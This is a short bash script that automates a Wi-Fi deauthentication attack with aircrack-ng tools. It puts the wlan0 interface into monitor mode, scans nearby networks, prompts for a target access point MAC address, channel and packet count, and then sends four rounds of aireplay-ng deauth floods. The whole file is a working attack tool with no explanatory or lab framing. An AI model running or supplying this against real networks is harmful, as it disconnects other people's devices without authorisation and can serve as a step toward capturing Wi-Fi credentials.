#!/bin/bash

sudo airmon-ng start wlan0
sleep 3

iwconfig
sleep 3

sudo bash -c 'timeout 20 airodump-ng wlan0'

read -p "Enter MAC-address: " mac_address
read -p "Choose channel: " channel
read -p "Number of pachadges: " packets

if [ -z "$channel" ]; then
    echo "Channel not chosen. Ending...."
    exit 1
fi

sudo iwconfig wlan0 channel "$channel"
sleep 3

sudo aireplay-ng --deauth "$packets" -a "$mac_address" wlan0
sleep 5
sudo aireplay-ng --deauth "$packets" -a "$mac_address" wlan0
sleep 5
sudo aireplay-ng --deauth "$packets" -a "$mac_address" wlan0
sleep 5
sudo aireplay-ng --deauth "$packets" -a "$mac_address" wlan0
sleep 5
